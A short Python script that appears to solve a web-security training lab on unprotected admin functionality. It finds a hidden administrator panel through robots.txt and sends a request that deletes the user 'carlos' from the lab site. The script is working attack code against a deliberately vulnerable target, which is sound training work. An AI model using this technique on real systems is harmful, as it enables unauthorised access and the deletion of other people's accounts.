# Lab: Unprotected admin functionality

import requests

#url = "https://0aea000204c8d0be8077a88e007c00c6.web-security-academy.net/robots.txt"    # new info: Disallow: /administrator-panel
#url = "https://0aea000204c8d0be8077a88e007c00c6.web-security-academy.net/administrator-panel"
'''
    <span>wiener - </span>
    <a href="/administrator-panel/delete?username=wiener">Delete</a>

    <span>carlos - </span>
    <a href="/administrator-panel/delete?username=carlos">Delete</a>
'''
url = "https://0aea000204c8d0be8077a88e007c00c6.web-security-academy.net/administrator-panel/delete?username=carlos"
cookies ={
    'session':'KtvjKjKPf9TOgu89M14spBItJv0iGG17'
}

r = requests.get(url, cookies=cookies)
print(r.text)